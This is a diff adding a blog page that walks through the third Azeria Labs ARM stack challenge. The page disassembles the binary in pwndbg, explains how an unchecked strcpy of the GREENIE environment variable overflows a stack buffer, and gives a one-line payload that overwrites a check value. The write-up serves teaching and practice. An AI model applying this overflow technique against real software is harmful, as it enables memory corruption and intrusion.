@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Smashing ARM Stack for Fun - Part III</title>
+  <meta name="description" content="Another fast moving postabout exploiting the third Arm challenge">
+
+  
+    <link href='//fonts.googleapis.com/css?family=Lato:400,400italic' rel='stylesheet' type='text/css'>
+  
+
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        extensions: ["tex2jax.js"],
+        jax: ["input/TeX","output/HTML-CSS"],
+        tex2jax: {inlineMath: [["$$","$$"],["\\(","\\)"]]},
+	TeX: {
+	  Macros: {
+            
+	  }
+	}
+      });
+    </script>
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js' async></script>
+    
+  
+
+  
+    <script
+       src="https://code.jquery.com/jquery-3.4.1.min.js"
+       integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+       crossorigin="anonymous"></script>
+  
+
+  
+
+    
+      <script src='https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore-min.js' ></script>
+    
+
+    
+      <script src="https://d3js.org/d3.v4.min.js"></script>
+    
+
+    <script src='/book-of-gehn/js/venn/venn.min.js'></script>
+    <script src='/book-of-gehn/js/venn/helper.js'></script>
+
+    <script src='/book-of-gehn/js/fix_syntax_highlight.js'></script>
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/tufte.css">
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/latex.css">
+
+  <link rel="canonical" href="/book-of-gehn/articles/2021/01/18/Smashing-ARM-Stack-for-Fun-Part-III.html">
+
+  <link rel="stylesheet" type="text/css" href="/book-of-gehn/css/all.min.css">
+
+  <link type="application/atom+xml" rel="alternate" href="/book-of-gehn/feed.xml" title="The Book of Gehn" />
+</head>
+
+  <body>
+    <header>
+	
+		<h1 class="header-title"><a href="/book-of-gehn/">The Book of Gehn</a></h1>
+		
+		
+	
+
+    
+
+    
+</header>
+
+    <article class="group">
+      <h1>Smashing ARM Stack for Fun - Part III</h1>
+<p class="subtitle">January 18, 2021</p>
+
+<p>Another fast moving post
+about exploiting the <a href="https://github.com/azeria-labs/ARM-challenges">third Arm challenge</a><!--more--></p>
+
+<h2 id="setup">Setup</h2>
+
+<p>Stack allocation, not changes respect <code class="highlighter-rouge">stack0</code> or <code class="highlighter-rouge">stack1</code>.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span>
+ <span class="err">►</span> <span class="mh">0x104e4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;</span>       <span class="k">push</span>   <span class="err">{</span><span class="n">fp</span><span class="p">,</span> <span class="n">lr</span><span class="err">}</span>
+   <span class="mh">0x104e8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>     <span class="k">add</span>    <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mi">4</span>
+   <span class="mh">0x104ec</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">8</span><span class="o">&gt;</span>     <span class="k">sub</span>    <span class="n">sp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x50</span>
+   <span class="mh">0x104f0</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">12</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x50</span><span class="err">]</span>
+   <span class="mh">0x104f4</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">16</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0x54</span><span class="err">]</span>
+</code></pre></div></div>
+
+<p>Read of an environment variable named <code class="highlighter-rouge">"GREENIE"</code>:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x104f8</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">20</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x6c</span><span class="err">]</span>
+   <span class="mh">0x104fc</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">24</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">getenv</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">getenv</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x1056c</span>
+<span class="mh">0x1056c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">136</span><span class="o">&gt;:</span>     <span class="mh">0x000105f4</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">sb</span> <span class="mh">0x000105f4</span>
+<span class="mh">0x105f4</span><span class="o">:</span>        <span class="s">"GREENIE"</span>
+</code></pre></div></div>
+
+<p>The value is stored in the stack, loaded from it and
+then compared with 0. In other words the program checks if <code class="highlighter-rouge">getenv</code>
+returned <code class="highlighter-rouge">NULL</code> or not.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x10500</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10504</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">32</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10508</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">36</span><span class="o">&gt;</span>    <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+   <span class="mh">0x1050c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">40</span><span class="o">&gt;</span>    <span class="n">bne</span>    <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h2 id="the-vulnerability">The vulnerability</h2>
+
+<p>Following the <em>taken</em> branch we find the vulnerable <code class="highlighter-rouge">strcpy</code> call
+that copies the content of the environment variable into a buffer in the
+stack.</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="err">►</span> <span class="mh">0x1051c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">56</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">#</span><span class="mi">0</span>
+   <span class="mh">0x10520</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">60</span><span class="o">&gt;</span>    <span class="k">str</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0xc</span><span class="err">]</span>
+   <span class="mh">0x10524</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>    <span class="k">sub</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x4c</span>
+   <span class="mh">0x10528</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">68</span><span class="o">&gt;</span>    <span class="k">mov</span>    <span class="n">r0</span><span class="p">,</span> <span class="n">r3</span>
+   <span class="mh">0x1052c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">72</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r1</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mi">8</span><span class="err">]</span>
+   <span class="mh">0x10530</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">76</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>This is the memory layout of the stack before the call to <code class="highlighter-rouge">strcpy</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">100</span><span class="p">:</span><span class="mi">20</span><span class="o">&gt;</span> <span class="p">;</span><span class="err">!</span> <span class="n">M</span><span class="p">[</span><span class="n">sp</span><span class="p">:]</span>
+<span class="p">[</span>
+        <span class="o">--</span>
+        <span class="o">|</span>   \<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>\<span class="n">xee</span>   <span class="o">==</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span>
+        <span class="o">|</span>   \<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>\<span class="n">xdd</span>   <span class="o">==</span> <span class="nb">int</span> <span class="n">argc</span>
+<span class="n">buf</span> <span class="o">----|--&gt;</span><span class="n">AAAA</span>
+  <span class="mh">0x50</span>  <span class="o">|</span>   <span class="n">BBBB</span>
+        <span class="o">|</span>   <span class="n">CCCC</span>
+        <span class="o">|</span>   <span class="o">...</span> <span class="mi">13</span> <span class="n">more</span> <span class="n">rows</span> <span class="n">full</span> <span class="n">of</span> <span class="n">garbage</span> <span class="o">...</span>
+<span class="n">cookie</span><span class="o">-----&gt;</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>   <span class="o">==</span> <span class="n">explicit</span> <span class="mi">0</span> <span class="nb">set</span>
+<span class="n">ptr</span> <span class="n">env</span><span class="o">-|--&gt;</span>\<span class="n">xcc</span>\<span class="n">xcc</span>\<span class="n">xcc</span>\<span class="n">xcc</span>   <span class="o">==</span> <span class="n">char</span> <span class="o">*</span><span class="n">env_var</span>
+        <span class="o">--</span>
+   <span class="mh">0x8</span>  <span class="o">|</span>   \<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>\<span class="n">xbb</span>   <span class="o">==</span> <span class="n">fp</span>
+ <span class="n">fp</span> <span class="o">----|--&gt;</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>\<span class="n">xaa</span>   <span class="o">==</span> <span class="n">lr</span>
+        <span class="o">--</span>
+<span class="p">]</span>
+</code></pre></div></div>
+
+<p>After the call the cookie is checked against 0x0d0a0d0a:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x10534</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">80</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r3</span><span class="p">,</span> <span class="err">[</span><span class="n">fp</span><span class="p">,</span> <span class="err">#</span><span class="o">-</span><span class="mh">0xc</span><span class="err">]</span>
+   <span class="mh">0x10538</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span>    <span class="n">ldr</span>    <span class="n">r2</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x34</span><span class="err">]</span>
+   <span class="mh">0x1053c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">88</span><span class="o">&gt;</span>    <span class="k">cmp</span>    <span class="n">r3</span><span class="p">,</span> <span class="n">r2</span>
+   <span class="mh">0x10540</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span>    <span class="n">bne</span>    <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">108</span><span class="o">&gt;</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10574</span>
+<span class="mh">0x10574</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">144</span><span class="o">&gt;:</span>     <span class="mh">0x0d0a0d0a</span>
+</code></pre></div></div>
+
+<p>Following the path if the branch is <strong>not</strong> taken:</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">pdisass</span> <span class="o">&amp;</span><span class="n">main</span><span class="o">+</span><span class="mi">96</span>
+ <span class="err">►</span> <span class="mh">0x10544</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span>     <span class="n">ldr</span>    <span class="n">r0</span><span class="p">,</span> <span class="err">[</span><span class="n">pc</span><span class="p">,</span> <span class="err">#</span><span class="mh">0x2c</span><span class="err">]</span>
+   <span class="mh">0x10548</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span>    <span class="n">bl</span>     <span class="err">#</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span> <span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+   <span class="mh">0x1054c</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">104</span><span class="o">&gt;</span>    <span class="n">b</span>      <span class="err">#</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">124</span><span class="o">&gt;</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">wx</span> <span class="mh">0x10578</span>
+<span class="mh">0x10578</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">148</span><span class="o">&gt;:</span>     <span class="mh">0x0001062c</span>
+
+<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">1</span><span class="n">sb</span> <span class="mh">0x0001062c</span>
+<span class="mh">0x1062c</span><span class="o">:</span>        <span class="s">"you have correctly modified the variable"</span>
+</code></pre></div></div>
+
+<h2 id="the-solution">The solution</h2>
+
+<p>To win we need 0x40 bytes for padding and the cookie <code class="highlighter-rouge">"\n\r\n\r"</code>.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~<span class="nv">$ GREENIE</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-en</span> <span class="s1">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\r\n\r'</span><span class="si">)</span><span class="s2">"</span> ./stack2
+you have correctly modified the variable
+</code></pre></div></div>
+
+
+
+    </article>
+    <span class="print-footer">Smashing ARM Stack for Fun - Part III - January 18, 2021 - Gehn</span>
+    <footer>
+    <hr class="slender">
+    <div class="credits">
+        <span>&copy; 2021
+            
+            Gehn
+        </span></br>
+            <a style="text-decoration: none;" href="/book-of-gehn/feed.xml"><img height="16px" width="16px" src="/book-of-gehn/assets/blog-assets/rss-32px.png" /></a>
+        <br>
+        
+
+    
+    </div>
+</footer>
+
+  </body>
+</html>
